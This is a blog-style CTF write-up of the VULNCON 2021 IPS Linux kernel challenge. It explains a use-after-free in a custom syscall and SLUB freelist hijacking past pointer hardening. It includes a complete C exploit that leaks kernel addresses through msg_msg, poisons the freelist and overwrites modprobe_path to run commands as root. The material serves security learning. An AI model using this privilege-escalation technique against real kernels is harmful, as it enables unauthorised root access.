---
title: "Learn Kernel Heap Freelist Hijacking from a CTF challenge: IPS(VULNCON 2021)"
date: 2024-02-28 19:08:29
tags: 
layout: post
---

# 0xFF tl;dr

I learned this skill from this [article][1].

This article introduces kernel heap freelist hijacking and related mitigations.

It's also a write-up for challenge IPS(VULNCON 2021).

# 0x00 Prologue

Before reading you should know: [Linux Kernel Exploitation Technique: Overwriting modprobe_path][4].

Thank @zolutal for saving me during hacking.

The first part of this article is the same as this [article][6], which introduces another method to solve this challenge. I attached these paragraphs for a better reading experience. 

# 0x01 Challenge

The attachment is available [here][5].

This challenge is not like other kernel challenges I solved - it implemented a syscall so our task for this challenge is exploiting the vulnerable syscall. The syscall IPS maintains an array of chunks while each chunk stores the user data. However, there are some interesting vulnerabilities in the syscall. 

## SYSCALL_DEFINE2

First, in `SYSCALL_DEFINE2`, here is a  `double_fetch`: It fetches `udata->data` twice: one for length check and another for copying. We can provide a valid length in check but provide a longer string while copying. However, Kyle told me it’s somehow hard to exploit so I just skipped this vulnerability. I’ll check why it’s hard to exploit later.

## copy_storage

Second, `copy_storage` didn’t check the return value of `target_idx` and `get_idx` may return `-1` when the array is full, which means `copy_storage` may copy the pointer to the `array[-1]`. Also, in `remove_storage`, we will not clean the pointer on `array[-1]`, which causes UAF.

## edit_storage

Luckily, for this function, it does nothing even if the `idx` is -1 so we can edit the `array[-1]`.

## Others

Other options in the challenge may pollute the kernel data, such as (`chunks[last_allocated_idx]->next = chunks[idx];` in `alloc_storage`). But it’s hard to use them to exploit so I only focused on the combination of `copy_storage` and `edit_storage` 


# 0x02 Freelist

Tip: what you should know [FREELIST pointer randomisation][3] before reading this section.


For objects in the same slab, there is metadata on the freed chunks, which is similar to the `fd` pointer in user space. It's also encoded by safe-linking. The related source code is in function [freelist_ptr_encode][7]

```c
static inline freeptr_t freelist_ptr_encode(const struct kmem_cache *s,
					    void *ptr, unsigned long ptr_addr)
{
	unsigned long encoded;

#ifdef CONFIG_SLAB_FREELIST_HARDENED
	encoded = (unsigned long)ptr ^ s->random ^ swab(ptr_addr);
#else
	encoded = (unsigned long)ptr;
#endif
	return (freeptr_t){.v = encoded};
}

```

If `CONFIG_SLAB_FREELIST_HARDENED` is enabled, we need to leak `s->random` and the address of the chunk that we try to attack. Btw, `swab` function changes the byte order of `ptr_addr`. For example, if `ptr_addr=0xdeadbeef11223344`, then `swab(ptr_addr)=0x44332211efbeadde`.

If we can modify the freelist, we can link an arbitrary fake object to the freelist and get it by the `malloc` function. There are no checks for alignment and other disgusting stuff in the user space heap. So we can link basically arbitrary writeable addresses into freelist to achieve arbitrary write. 


# 0x03 Exploitation

Unlike the solutions attacking the function pointers and other slabs, we can attack `modprobe_path` to transfer arbitrary writing to arbitrary execution.
And `modprobe_path`'s address is stable as long as we leak kernel.text, which is easier than crossing slab attacking. So the plan is 

- UAF
- Refill with msg_msg, modify the size of it to leak 
    - kernel.text so we know `modprobe_path`
    - operatable objects' address. It could be `msg_msg`, but I used the challenge's objects
- Arbitrary free a freed chunk and then refill it to modify the freelist
- Overwrite `modprobe_path` to execute commands



# 0x04 Exploitation Script

```c
#include "libx.h"
// https://github.com/n132/libx/tree/main
#include "libx.h"
#define ISP 548
typedef struct {
  int idx;
  unsigned short priority;
  char *data;} dt;
void add(char *buf, int priority){
    dt dt;
    dt.priority = priority;
    dt.data = buf;
    return syscall(ISP,1,&dt);
}
void del(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,2,&dt);
}
void edit(int idx, char *buf){
    dt dt;
    dt.idx = idx;
    dt.data = buf;
    return syscall(ISP,3,&dt);

}
void copy(int idx){
    dt dt;
    dt.idx = idx;
    return syscall(ISP,4,&dt);
}
int main()
{   
    char *atk = malloc(0x1000);
    memset(atk,'\1',0x1000);
    size_t *hook = &atk[0xfd0];
    char *ctx = calloc(1,0x1000);

    
    for(int i= 0 ; i< 0x10;i++)
    {
        memcpy(ctx,dp('i',10),10);
        add(ctx,0x1000+i);
    }
        
    copy(0);
    del(0);
    int msgid1 = msgGet();
    int msgid2 = msgGet();
    msgSend(msgid1,"Wat",0x50);
    
    edit(-1,strcat(dpn('\xff',10,18),p64(0x2024)));
    msgMsg* msg = msgRecv(msgid1,0x1000);
    msgSend(msgid2,"Wat",0x50); // Refil
    edit(-1,strcat(dpn('\xff',10,18),p64(0x2024)));
    char *msg_ctx = msg->mtext;
    

    struct memIPS{
        size_t next;
        size_t offset;
        size_t found;
    } mem[0x10];
    memset(mem,0,sizeof(mem));
    size_t kernel_text = 0;
    for(int i =0 ;i<0x200-2;i++){
        int idx = i+1;
        size_t value = *(size_t *)(&msg_ctx[idx*8]);
        // info(value);
        if(value==0x6969696969696969){
            size_t meta = *(size_t *)(&msg_ctx[i*8]);
            size_t ips_idx = (meta&0xff);
            mem[ips_idx].offset = i*8-8+0x30;
            mem[ips_idx].next = *(size_t *)(&msg_ctx[i*8-8]);
            mem[ips_idx].found = 1;
        }
        if((value&0xfff)==0x9a0){
            kernel_text = value;
        }

    }
    if(kernel_text==0)
        panic("[!] Can't Leak Kernel Text");
    else
        kernel_text -= 0x16429a0;
    
    size_t victim_addr  = 0;
    size_t leaker       = 0;
    size_t offFreelist= 0;
    
    for(int i=0;i<0x10;i++){
        if(mem[i].found == 1 && mem[i+1].found==1){            
            victim_addr = mem[i].next-mem[i+1].offset+mem[i].offset;
            leaker = mem[i].next+0x40;
            del(i);  // Free mem[i]
            del(i+1);// Free mem[i+1]
            offFreelist = mem[i+1].offset;
            break;
        }
    }
    if(offFreelist==0)
        panic("[!] Not able to find IPS objects.");
    
    msgid1 = msgGet();
    msg = msgRecv(msgid2,0x1000);
    msgSend(msgid1,"Wat",0x50); // Refil
    size_t  *leakedFd= msg->mtext+offFreelist+0x10;
    size_t magic = (*leakedFd)^(victim_addr)^(swab(leaker)); //Leak Magic
    info(magic);
    size_t modprobe = 0x144fa20+kernel_text;
    info(kernel_text);
    edit(-1,strcat(dpn('\xff',18,18+8),p64(leaker-0x40+0x10)));
    msgid2 = msgGet();
    msg = msgRecv(msgid1,1);
    msgSend(msgid2,strcat(dpn('\xff',0xfd0+0x28,0xfd0+0x78),p64(magic^swab(leaker)^(modprobe-0x10))),0xfd0+0x78);
    add(ctx,1);
    add(ctx,2);
    add(strcat(dpn('\xff',0x2,0x60),"/home/user/n132"),3);
    modprobeAtk("/home/user/","cat /flag > /n132");
    system("cat /n132");
}
```


# 0x05 Related Functions

- [msg_msg][2]

# 0x06 Epilogue

This method is simple since it only attacks the current slab page and it's very strong. We can get AAW from UAF if we can leak enough information. Moreover, we don't need to perform corse slab skills. Also, [modprobe_path][4] is a very helpful skill, it converts AAW to code execution. 


The path of this method is `Use After Free`->` Leaking + Arbitrary Address Free`->` Arbitrary Address Write`->` Code Exectuion`, which is kind of generic.


[0]: https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/
[1]: https://kileak.github.io/ctf/2021/vulncon-ips/
[2]: https://elixir.bootlin.com/linux/latest/source/ipc/msg.c
[3]: https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022
[4]: https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/
[5]: https://github.com/sajjadium/ctf-archives/tree/0328b950496e5d12b775e8bd67d1569977ec10c0/ctfs/VULNCON/2021/pwn/ips
[6]: https://n132.github.io/2024/02/09/IPS.html
[7]: https://elixir.bootlin.com/linux/latest/C/ident/freelist_ptr_encode